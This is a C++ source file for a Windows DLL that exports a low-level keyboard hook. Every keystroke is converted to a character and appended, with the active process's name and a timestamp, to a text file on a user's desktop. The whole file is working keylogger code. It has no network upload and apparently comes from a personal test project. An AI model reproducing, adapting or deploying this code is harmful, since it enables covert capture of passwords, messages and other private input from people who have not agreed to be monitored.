#include "Header.hh"

extern "C"
{
	__declspec(dllexport) LRESULT CALLBACK		 KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		if (nCode < 0)
			return CallNextHookEx(NULL, nCode, wParam, lParam);

		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			std::fstream file;
			std::string entry;
			file.open("C:\\Users\\Raphaël\\Desktop\\test.txt", std::fstream::in | std::fstream::app | std::fstream::out);
			if (file.is_open())
			{
				//Get character pressed
				KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
				BYTE keyboard_state[256];

				GetKeyboardState(keyboard_state);
				WORD character;

				if (!(MapVirtualKey(kbdStruct->vkCode, MAPVK_VK_TO_CHAR) >> (sizeof(UINT) * 8 - 1) & 1))
				{
					ToAscii((UINT)kbdStruct->vkCode, kbdStruct->scanCode,
						keyboard_state, &character, 0);
					entry += (char)(character);
				}

				// Get focused process name
				HWND hwnd = GetForegroundWindow(); // get handle of currently active window
				DWORD winId;
				GetWindowThreadProcessId(hwnd, &winId);
				HANDLE Handle = OpenProcess(
					PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
					FALSE,
					winId
					);
				if (Handle)
				{
					TCHAR Buffer[MAX_PATH];
					if (GetProcessImageFileName(Handle, Buffer, MAX_PATH))
					{
						std::string process = std::string(Buffer);
						entry += " " + process.substr(process.find_last_of("\\") + 1);
					}
					CloseHandle(Handle);
				}
				//struct tm *dt;
				time_t current;
				time(&current);
				std::stringstream ss;
				ss << current;
				//char buffer[30];
				//dt = localtime(&current);
				//strftime(buffer, sizeof(buffer), "%d/%m/%Y %H:%M:%S", dt);
				std::string tmp;
				ss >> tmp;
				entry += " " + tmp;
				entry += "\n";
				file << entry.c_str();
				file.close();
			}
			else
				std::cout << "could not open the file" << std::endl;
		}

		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
}